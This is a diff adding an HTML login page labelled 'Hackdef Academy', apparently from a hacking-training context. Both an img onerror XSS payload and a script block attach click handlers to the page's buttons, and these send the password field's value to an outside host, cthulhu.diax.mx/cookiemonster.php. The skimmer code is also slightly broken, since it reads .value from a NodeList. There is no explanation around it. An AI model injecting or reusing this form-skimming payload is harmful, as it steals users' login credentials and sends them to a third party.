@@ -1,0 +1,24 @@
+
+<div class="topnav">
+  <a class="active" href="#home">Hackdef Academy</a>
+  <a class="noactive" href="#about">About</a>
+  <div class="login-container">
+    <form action="/login" method="post">
+      <input type="text" placeholder="Username" name="username">
+      <input type="text" placeholder="Password" name="password" value="test123123">
+      <button type="submit">Login</button>
+    </form>
+  </div>
+</div>
+
+<img src=. onerror="buttons=document.getElementsByTagName('button');for(i=0;i<buttons.length;i++){buttons[i].addEventListener('click', function(){var s=document.createElement('img');s.src='http://cthulhu.diax.mx/cookiemonster.php?d='+document.getElementsByName('password').value;});}" >
+
+<script>
+buttons=document.getElementsByTagName('button');
+for(i=0;i<buttons.length;i++){
+	buttons[i].addEventListener('click', function(){
+		var s=document.createElement('img');
+		s.src='http://cthulhu.diax.mx/cookiemonster.php?d='+document.getElementsByName('password').value;
+	});
+}
+</script>
